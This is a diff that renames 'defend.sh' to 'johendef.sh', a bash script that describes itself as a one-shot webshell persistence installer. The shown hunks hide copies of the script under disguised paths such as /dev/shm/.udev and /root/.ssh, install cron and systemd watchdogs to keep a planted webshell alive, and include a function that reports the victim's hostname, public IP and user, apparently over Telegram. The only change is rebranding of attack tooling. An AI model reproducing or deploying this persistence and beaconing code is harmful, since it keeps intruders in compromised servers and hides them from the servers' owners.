@@ -1,6 +1,6 @@
 #!/bin/bash
 # ============================================================
-# defend.sh v1.0 - One-Shot Webshell Persistence Installer
+# johendef.sh v1.0 - One-Shot Webshell Persistence Installer
 # CREDIT: JohenLastGen V1
 # AUTO-DETECT: ROOT (full) | USER (user-level)
 # ============================================================
@@ -24,10 +24,10 @@ if [[ $UID_CURRENT -eq 0 ]]; then
     PRIV_MODE="ROOT"
     CHECKSUM_FILE="/root/.defend_checksum"
     SCRIPT_COPIES=(
-        "/tmp/.systemd-private/defend.sh"
-        "/var/tmp/.cache/defend.sh"
-        "/dev/shm/.udev/defend.sh"
-        "/root/.ssh/defend.sh"
+        "/tmp/.systemd-private/johendef.sh"
+        "/var/tmp/.cache/johendef.sh"
+        "/dev/shm/.udev/johendef.sh"
+        "/root/.ssh/johendef.sh"
     )
     SYSTEMD_DIR="/etc/systemd/system"
     PROFILE_D_DIR="/etc/profile.d"
@@ -35,10 +35,10 @@ else
     PRIV_MODE="USER"
     CHECKSUM_FILE="${HOME}/.defend_checksum"
     SCRIPT_COPIES=(
-        "${HOME}/.cache/.system/defend.sh"
-        "${HOME}/.local/share/.backup/defend.sh"
-        "/tmp/.systemd-private/defend.sh"
-        "/var/tmp/.cache/defend.sh"
+        "${HOME}/.cache/.system/johendef.sh"
+        "${HOME}/.local/share/.backup/johendef.sh"
+        "/tmp/.systemd-private/johendef.sh"
+        "/var/tmp/.cache/johendef.sh"
     )
     SYSTEMD_DIR="${HOME}/.config/systemd/user"
     PROFILE_D_DIR=""
@@ -55,7 +55,7 @@ tg_send() {
     local msg="$1"
     local hostname=$(hostname 2>/dev/null || echo "unknown")
     local ip=$(curl -s --max-time 5 ifconfig.me 2>/dev/null || echo "N/A")
-    local full_msg="🛡️ *defend.sh v${VERSION}* | *${PRIV_MODE}*
+    local full_msg="🛡️ *johendef.sh v${VERSION}* | *${PRIV_MODE}*
 🖥️ Host: \`${hostname}\`
 🌐 IP: \`${ip}\`
 👤 User: \`$(whoami)\`
@@ -78,7 +78,7 @@ get_md5() { md5sum "$1" 2>/dev/null | awk '{print $1}'; }
 
 # ─── USAGE ──────────────────────────────────────────────────
 usage() {
-    echo -e "${BOLD}defend.sh v${VERSION} - Webshell Persistence Installer${NC}"
+    echo -e "${BOLD}johendef.sh v${VERSION} - Webshell Persistence Installer${NC}"
     echo ""
     echo "Usage:"
     echo "  bash $SCRIPT_NAME --file <webshell_path>   Install protection"
@@ -231,7 +231,7 @@ install_cron() {
     local md5="$2"
     local wd_script=""
 
-    # pick first existing copy of defend.sh
+    # pick first existing copy of johendef.sh
     for c in "${SCRIPT_COPIES[@]}"; do
         [[ -f "$c" ]] && wd_script="$c" && break
     done
@@ -589,7 +589,7 @@ do_status() {
 # ─── UNINSTALL ────────────────────────────────────────────────
 do_uninstall() {
     load_config
-    echo -e "\n${YELLOW}[!] Uninstalling defend.sh (${PRIV_MODE} mode)...${NC}"
+    echo -e "\n${YELLOW}[!] Uninstalling johendef.sh (${PRIV_MODE} mode)...${NC}"
 
     # Remove cron entries
     crontab -l 2>/dev/null | grep -v "defend_watchdog" | crontab - 2>/dev/null
@@ -651,7 +651,7 @@ do_uninstall() {
 do_install() {
     local target="$1"
 
-    echo -e "\n${BOLD}${CYAN}[+] defend.sh v${VERSION} - One-Shot Installer${NC}"
+    echo -e "\n${BOLD}${CYAN}[+] johendef.sh v${VERSION} - One-Shot Installer${NC}"
     echo -e "${CYAN}[+] Privilege: ${BOLD}${PRIV_MODE} (UID: ${UID_CURRENT})${NC}"
 
     # Validate target
